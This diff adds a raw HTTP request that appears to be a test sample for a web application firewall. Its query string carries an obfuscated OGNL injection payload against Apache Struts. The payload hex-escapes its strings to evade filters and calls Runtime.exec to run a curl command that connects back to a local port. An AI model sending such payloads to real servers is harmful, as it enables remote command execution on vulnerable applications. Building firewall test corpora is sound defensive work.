@@ -1,0 +1,13 @@
+PUT /?hypothesis=allocate&hyphen=argument&marry=restriction&encapsulate=%28%23context%3D%23attr%5B%27%5Cx73%27%2B%27%5Cx74%27%2B%27%5Cx72%27%2B%27%5Cx75%27%2B%27%5Cx74%27%2B%27%5Cx73%27%2B%27%5Cx2e%27%2B%27%5Cx76%27%2B%27%5Cx61%27%2B%27%5Cx6c%27%2B%27%5Cx75%27%2B%27%5Cx65%27%2B%27%5Cx53%27%2B%27%5Cx74%27%2B%27%5Cx61%27%2B%27%5Cx63%27%2B%27%5Cx6b%27%20%5D.context%29.%28%23context.setMemberAccess%28%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27%5Cx63%27%2B%27%5Cx75%27%2B%27%5Cx72%27%2B%27%5Cx6c%27%2B%27%5Cx20%27%2B%27%5Cx31%27%2B%27%5Cx32%27%2B%27%5Cx37%27%2B%27%5Cx2e%27%2B%27%5Cx30%27%2B%27%5Cx2e%27%2B%27%5Cx30%27%2B%27%5Cx2e%27%2B%27%5Cx31%27%2B%27%5Cx3a%27%2B%27%5Cx39%27%2B%27%5Cx30%27%2B%27%5Cx30%27%2B%27%5Cx31%27%20%29%29 HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; FC Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0
+Cookie: resolver=scope; implement=UUID%20/%20GUID; SESSIONID=a35c05a273cd4b916535fe26585f00b64a949a4491145100acc13aad783384868fb3f9b2e7771db084dd536f4809fffc
+
